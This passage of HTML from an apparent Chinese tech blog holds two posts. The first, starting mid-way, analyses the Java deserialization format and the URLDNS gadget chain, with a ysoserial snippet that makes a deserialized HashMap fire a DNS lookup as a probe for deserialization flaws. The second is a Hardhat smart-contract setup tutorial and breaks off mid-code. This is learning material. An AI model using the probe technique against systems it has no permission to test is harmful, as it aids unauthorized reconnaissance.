class="hljs-variable">example</span><span class="hljs-operator">.</span><span class="hljs-variable">Person</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x6f72672e6578616d706c652e506572736f6e</span><br>      <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">xcc</span> <span class="hljs-number">5</span><span class="hljs-variable">e</span> <span class="hljs-number">4</span><span class="hljs-variable">d</span> <span class="hljs-number">5</span><span class="hljs-variable">d</span> <span class="hljs-variable">ef</span> <span class="hljs-variable">ba</span> <span class="hljs-variable">cd</span> <span class="hljs-number">05</span><br>      <span class="hljs-variable">newHandle</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">7</span><span class="hljs-variable">e</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>      <span class="hljs-variable">classDescFlags</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x02</span> <span class="hljs-operator">-</span> <span class="hljs-type">SC_SERIALIZABLE</span><br>      <span class="hljs-variable">fieldCount</span> <span class="hljs-operator">-</span> <span class="hljs-number">3</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">03</span><br>      <span class="hljs-variable">Fields</span><br>        <span class="hljs-number">0</span><span class="hljs-operator">:</span><br>          <span class="hljs-variable">Int</span> <span class="hljs-operator">-</span> <span class="hljs-built_in">I</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x49</span><br>          <span class="hljs-variable">fieldName</span><br>            <span class="hljs-built_in">Length</span> <span class="hljs-operator">-</span> <span class="hljs-number">3</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">03</span><br>            <span class="hljs-built_in">Value</span> <span class="hljs-operator">-</span> <span class="hljs-variable">age</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x616765</span><br>        <span class="hljs-number">1</span><span class="hljs-operator">:</span><br>          <span class="hljs-variable">Object</span> <span class="hljs-operator">-</span> <span class="hljs-variable">L</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x4c</span><br>          <span class="hljs-variable">fieldName</span><br>            <span class="hljs-built_in">Length</span> <span class="hljs-operator">-</span> <span class="hljs-number">6</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">06</span><br>            <span class="hljs-built_in">Value</span> <span class="hljs-operator">-</span> <span class="hljs-variable">idCard</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x696443617264</span><br>          <span class="hljs-variable">className1</span><br>            <span class="hljs-type">TC_STRING</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x74</span><br>              <span class="hljs-variable">newHandle</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">7</span><span class="hljs-variable">e</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>              <span class="hljs-built_in">Length</span> <span class="hljs-operator">-</span> <span class="hljs-number">18</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">12</span><br>              <span class="hljs-built_in">Value</span> <span class="hljs-operator">-</span> <span class="hljs-variable">Ljava</span><span class="hljs-operator">/</span><span class="hljs-variable">lang</span><span class="hljs-operator">/</span><span class="hljs-built_in">String</span><span class="hljs-operator">;</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x4c6a6176612f6c616e672f537472696e673b</span><br>        <span class="hljs-number">2</span><span class="hljs-operator">:</span><br>          <span class="hljs-variable">Object</span> <span class="hljs-operator">-</span> <span class="hljs-variable">L</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x4c</span><br>          <span class="hljs-variable">fieldName</span><br>            <span class="hljs-built_in">Length</span> <span class="hljs-operator">-</span> <span class="hljs-number">4</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-built_in">Value</span> <span class="hljs-operator">-</span> <span class="hljs-variable">name</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x6e616d65</span><br>          <span class="hljs-variable">className1</span><br>            <span class="hljs-type">TC_REFERENCE</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x71</span><br>              <span class="hljs-variable">Handle</span> <span class="hljs-operator">-</span> <span class="hljs-number">8257537</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">7</span><span class="hljs-variable">e</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>      <span class="hljs-variable">classAnnotations</span><br>        <span class="hljs-type">TC_ENDBLOCKDATA</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x78</span><br>      <span class="hljs-variable">superClassDesc</span><br>        <span class="hljs-type">TC_NULL</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x70</span><br>    <span class="hljs-variable">newHandle</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">7</span><span class="hljs-variable">e</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span><br>    <span class="hljs-variable">classdata</span><br>      <span class="hljs-variable">org</span><span class="hljs-operator">.</span><span class="hljs-variable">example</span><span class="hljs-operator">.</span><span class="hljs-variable">Person</span><br>        <span class="hljs-variable">values</span><br>          <span class="hljs-variable">age</span><br>            <span class="hljs-punctuation">(</span><span class="hljs-variable">int</span><span class="hljs-punctuation">)</span><span class="hljs-number">0</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>          <span class="hljs-variable">idCard</span><br>            <span class="hljs-punctuation">(</span><span class="hljs-variable">object</span><span class="hljs-punctuation">)</span><br>              <span class="hljs-type">TC_NULL</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x70</span><br>          <span class="hljs-variable">name</span><br>            <span class="hljs-punctuation">(</span><span class="hljs-variable">object</span><span class="hljs-punctuation">)</span><br>              <span class="hljs-type">TC_NULL</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x70</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404021555608.png" alt="image.png"><br>具体的过程就是这样，如果想要了解更多细节，可以自行去跟进一下。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="HashMap前置"><a href="#HashMap前置" class="headerlink" title="HashMap前置"></a>HashMap前置</h2><p>学了这么久的前置知识总算可以开始正式跟进链子了，接下来的过程就和php中的反序列化差不多了，只要对逻辑填空即可。虽然并不需要过深的了解hashmap得实现原理，但是也大概的看一下有个底吧。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404021955694.png" alt="image.png"></p><p>这里了解的是触发dns的是hashcode方法，也就是在计算键的hashcode决定存储位置的时候触发的dns。但是在HashMap中put时会自动调用hashcode来计算，从而导致在序列化时就触发dns，但是由源码可知</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-keyword">if</span> (hashCode != <span class="hljs-number">-1</span>)  <br>        <span class="hljs-keyword">return</span> hashCode;  <br>  <br>    hashCode = <span class="hljs-keyword">handler</span>.hashCode(<span class="hljs-keyword">this</span>);  <br>    <span class="hljs-keyword">return</span> hashCode;  <br>&#125;<br></code></pre></td></tr></table></figure><p>当hashCode为-1时将会重新计算，也就是说我们需要在put之后将hashCode设置回-1。从而让它能够再次进行hashcode计算，触发dns。所以在ysoserial中可以看到payload的这段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>使用内部方法  <br>f.setAccessible(true);  <br>  <br><span class="hljs-regexp">//</span> put 一个值的时候就不会去查询 DNS，避免和刚刚混淆  <br>f.set(url, <span class="hljs-number">0</span>xdeadbeef);  <br>hashMap.put(url, <span class="hljs-string">&quot;zeo&quot;</span>);  <br>  <br><span class="hljs-regexp">//</span> hashCode 这个属性放进去后设回 -<span class="hljs-number">1</span>, 这样在反序列化时就会重新计算 hashCodef.set(url, -<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h2 id="跟进过程"><a href="#跟进过程" class="headerlink" title="跟进过程"></a>跟进过程</h2><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404021945025.png" alt="image.png"><br>上图是HashMap的readObject的最后一段，可以看到通过读取字节数据然后反序列化成对象，再调用putVal方法存储。这里的hash函数的作用是计算这个键的hashcode，然后决定存储到哪个桶当中(桶数组的索引为hashcode)，之所以一个桶当中会出现多个元素就是因为发生了hash碰撞，即不同的键对应着相同的hashcode。<br>然后进入hash方法<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404021958280.png" alt="image.png"><br>可以发现只要键不为空就会调用键自带的hashcode方法，于是我们继续跟进hashcode方法。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404021959750.png" alt="image.png"><br>然后通过handler这个变量调用URLStreamHandler中计算hashcode的方法。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404022002537.png" alt="image.png"><br>到这里就可以看到url这个参数了，也就说明我们离触发不远了。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404022005192.png" alt="image.png"><br>然后这里的getByName就是通过主机名查询IP地址，也就是dns查询，所以这里会触发dns。如果dnslog中出现了记录，那么就说明存在反序列化。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hardhat开发</title>
    <link href="/2023/08/04/Hardhat%E5%BC%80%E5%8F%91/"/>
    <url>/2023/08/04/Hardhat%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="Hardhat-项目创建"><a href="#Hardhat-项目创建" class="headerlink" title="Hardhat 项目创建"></a>Hardhat 项目创建</h1><h2 id="安装hardhat"><a href="#安装hardhat" class="headerlink" title="安装hardhat"></a>安装hardhat</h2><p>首先创建一个项目文件夹<br>然后使用<code>yarn init</code>命令初始化项目文件夹<br>接下来就可以直接使用yarn这个包管理工具安装也可以用npm安装</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">yarn <span class="hljs-built_in">add</span> <span class="hljs-comment">--dev hardhat</span><span class="hljs-comment"></span><br><span class="hljs-comment">//or</span><br>npm install <span class="hljs-comment">--save-dev hardhat</span><br></code></pre></td></tr></table></figure><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>使用<br><code>yarn hardhat</code><br>出现如下界面<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308040907881.png" alt="image.png"></p><p>选择创建项目然后一路y到底即可</p><h1 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h1><p>只要介绍一下各个文件夹的作用，我这里会议fundme的智能合约为例</p><h2 id="项目环境配置"><a href="#项目环境配置" class="headerlink" title="项目环境配置"></a>项目环境配置</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>首先的重重之重就是环境变量，在开发时会需要用到一些私密的接口以及密钥等不能向外界传播的数据，但是使用频次也比较高，于是我们就可以使用环境变量来操作这些数据。<br>要在项目中使用这个需要安装一个包<br><code>yarn add --dev dotenv</code><br>然后再项目中创建一个.env文件夹用于存放环境变量<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308040929484.png" alt="image.png"></p><h3 id="hardhat-config-js"><a href="#hardhat-config-js" class="headerlink" title="hardhat-config.js"></a>hardhat-config.js</h3><p>然后就是项目中至关重要的一个配置文件，如果没有配置好，那肯定是爆红少不了。<br>测试用的网络配置，插件的配置，以及测试使用的账户配置都在里面<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308040933498.png" alt="image.png"><br>具体的代码如下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs dts">require(<span class="hljs-string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>)<span class="hljs-punctuation">;</span><br><br>require(<span class="hljs-string">&quot;hardhat-deploy&quot;</span>)<span class="hljs-punctuation">;</span><br><br>require(<span class="hljs-string">&quot;dotenv&quot;</span>).config()<span class="hljs-punctuation">;</span><br><br>require(<span class="hljs-string">&quot;@nomiclabs/hardhat-ethers&quot;</span>)<span class="hljs-punctuation">;</span><br><br>require(<span class="hljs-string">&quot;@nomicfoundation/hardhat-verify&quot;</span>)<span class="hljs-punctuation">;</span><br><br>require(<span class="hljs-string">&quot;hardhat-gas-reporter&quot;</span>)<span class="hljs-punctuation">;</span><br><br>  <br><br><span class="hljs-comment">/** @type import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span><br><br><span class="hljs-comment">//将环境变量赋值给文件中的变量方便使用</span><br><br>const PRIVATE_KEY = process.env.SEPOLIA_PRIVATE_KEY<span class="hljs-punctuation">;</span><br><br>const SEPOLIA_RPC_URL = process.env.SEPOLIA_RPC_URL<span class="hljs-punctuation">;</span><br><br>const ETHERSCAN_API_KEY = process.env.ETHERSCAN_API_KEY<span class="hljs-punctuation">;</span><br><br>const COINMARKET_API_KEY = process.env.COINMARKET_API_KEY<span class="hljs-punctuation">;</span><br><br>module.<span class="hljs-attr">exports</span> <span class="hljs-operator">=</span> <span class="hljs-punctuation">&#123;</span><br><br>  <span class="hljs-comment">// solidity: &quot;0.8.19&quot;,</span><br><br>  <span class="hljs-comment">//这里是设置solidity的编译版本，通过如下方法可以设置多个版本，只需要一个的花上面的注释内容即可满足</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  solidity:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    compilers:</span> [<span class="hljs-punctuation">&#123;</span> version: <span class="hljs-string">&quot;0.8.8&quot;</span> <span class="hljs-punctuation">&#125;</span>, <span class="hljs-punctuation">&#123;</span> version: <span class="hljs-string">&quot;0.6.6&quot;</span> <span class="hljs-punctuation">&#125;</span>],<br><br>  <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-comment">//网络配置，这个主要是公链的配置，本地网络的配置就和之前的ganache差不多，运行yarn hardhat node即可</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  defaultNetwork:</span> <span class="hljs-string">&quot;hardhat&quot;</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  networks:</span> <span class="hljs-punctuation">&#123;</span><br><br>    <span class="hljs-comment">// hardhat: &#123;</span><br><br>    <span class="hljs-comment">//   chainId: 31337,</span><br><br>    <span class="hljs-comment">//   // gasPrice: 130000000000,</span><br><br>    <span class="hljs-comment">// &#125;,</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    sepolia:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      url:</span> SEPOLIA_RPC_URL,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      accounts:</span> [PRIVATE_KEY],<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      chainId:</span> <span class="hljs-number">11155111</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      blockConfirmations:</span> <span class="hljs-number">6</span>,<br><br>    <span class="hljs-punctuation">&#125;</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    localhost:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8545/&quot;</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      chainId:</span> <span class="hljs-number">31337</span>,<br><br>    <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-comment">//用于查看合约的部署情况</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  etherscan:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    apiKey:</span> ETHERSCAN_API_KEY,<br><br>  <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-comment">//对合约的gas使用情况进行统计</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  gasReporter:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    enabled:</span> false,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    outputFile:</span> <span class="hljs-string">&quot;gas-report.txt&quot;</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    noColors:</span> true,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    currency:</span> <span class="hljs-string">&quot;USD&quot;</span>,<br><br>    <span class="hljs-comment">// coinmarketcap: COINMARKET_API_KEY,</span><br><br>    <span class="hljs-comment">// token: &quot;ETH&quot;,</span><br><br>  <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-comment">//使用本地网络时，所用到的账户</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  namedAccounts:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    deployer:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      default:</span> <span class="hljs-number">0</span>,<br><br>    <span class="hljs-punctuation">&#125;</span>,<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    user:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      default:</span> <span class="hljs-number">1</span>,<br><br>    <span class="hljs-punctuation">&#125;</span>,<br><br>  <span class="hljs-punctuation">&#125;</span>,<br><br><span class="hljs-punctuation">&#125;;</span><br></code></pre></td></tr></table></figure><h3 id="mocking"><a href="#mocking" class="headerlink" title="mocking"></a>mocking</h3><p>由于在使用本地网络时无法像在网络上一样得知加密货币与真实货币之间的汇率。<br>我们需要使用solidity搭建一个会在本地返回汇率的工具；<br>这个可以在github上找到这个<br><a href="https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.6/FluxAggregator.sol">sol代码</a><br>可以将它直接复制到本地编译也可以通过import把它导入到本地<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041113490.png" alt="image.png"><br>至于这个solidity的版本我并没有去尝试更多版本，毕竟这中版本引起的报错真的太难解决了。把这个合约代码写好之后就需要将它部署。因此还需要写一个部署脚本；<br>在部署我们的fundme合约之前部署它即可。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041116656.png" alt="image.png"><br>由于他们是按顺序执行的脚本所以我们将脚本编号；<br>部署的代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123; network &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123;<br><br>  developmentChains,<br><br>  <span class="hljs-variable constant_">DECIMALS</span>,<br><br>  <span class="hljs-variable constant_">INITIAL_ANSWER</span>,<br><br>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../helper-hardhat-config&quot;</span>);<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">async</span> (&#123; getNamedAccounts, deployments &#125;) =&gt; &#123;<br><br>  <span class="hljs-keyword">const</span> &#123; deploy, log &#125; = deployments;<br><br>  <span class="hljs-keyword">const</span> &#123; deployer &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getNamedAccounts</span>();<br><br>  <span class="hljs-keyword">const</span> chainId = network.<span class="hljs-property">config</span>.<span class="hljs-property">chainId</span>;<br><br>  <br><br>  <span class="hljs-keyword">if</span> (developmentChains.<span class="hljs-title function_">includes</span>(network.<span class="hljs-property">name</span>)) &#123;<br><br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Local network detected! Deploying mocks..&quot;</span>);<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">deploy</span>(<span class="hljs-string">&quot;MockV3Aggregator&quot;</span>, &#123;<br><br>      <span class="hljs-attr">contract</span>: <span class="hljs-string">&quot;MockV3Aggregator&quot;</span>,<br><br>      <span class="hljs-attr">from</span>: deployer,<br><br>      <span class="hljs-attr">log</span>: <span class="hljs-literal">true</span>,<br><br>      <span class="hljs-comment">/*下面是传入MockV3Aggregator中的构造参数*/</span><br><br>      <span class="hljs-attr">args</span>: [<span class="hljs-variable constant_">DECIMALS</span>, <span class="hljs-variable constant_">INITIAL_ANSWER</span>],<br><br>    &#125;);<br><br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Mocks deployed!&quot;</span>);<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;-------------------------------------------&quot;</span>);<br><br>  &#125;<br><br>&#125;;<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">tags</span> = [<span class="hljs-string">&quot;all&quot;</span>, <span class="hljs-string">&quot;mocks&quot;</span>];<br></code></pre></td></tr></table></figure><p>讲到这个mocks的部署代码就不得不讲一下helper-hardhat-config.js中的网络设置了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">const</span> <span class="hljs-variable">networkConfig</span> <span class="hljs-operator">=</span> &#123;<br><br>  <span class="hljs-number">11155111</span>: &#123;<br><br>    name: <span class="hljs-string">&quot;sepolia&quot;</span>,<br><br>    ethUsdPriceFeed: <span class="hljs-string">&quot;0x694AA1769357215DE4FAC081bf1f309aDC325306&quot;</span>,<br><br>  &#125;,<br><br>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-variable">developmentChains</span> <span class="hljs-operator">=</span> [<span class="hljs-string">&quot;hardhat&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>];<br><span class="hljs-comment">//传递给mock的参数用来初始化feedprice</span><br><span class="hljs-type">const</span> <span class="hljs-variable">DECIMALS</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-variable">INITIAL_ANSWER</span> <span class="hljs-operator">=</span> <span class="hljs-number">200000000000</span>;<br><br><span class="hljs-keyword">module</span>.<span class="hljs-keyword">exports</span> = &#123;<br><br>  networkConfig,<br><br>  developmentChains,<br><br>  DECIMALS,<br><br>  INITIAL_ANSWER,<br><br>&#125;;<br></code></pre></td></tr></table></figure><p>这个配置文件可以根据运行时包含的网络选项，从而获取相应的FeedPrice，后面module.exports中的变量可以在导入了这个包中的其他文件中使用</p><h1 id="合约代码及脚本的编写"><a href="#合约代码及脚本的编写" class="headerlink" title="合约代码及脚本的编写"></a>合约代码及脚本的编写</h1><h2 id="合约"><a href="#合约" class="headerlink" title="合约"></a>合约</h2><h3 id="Fundme"><a href="#Fundme" class="headerlink" title="Fundme"></a>Fundme</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 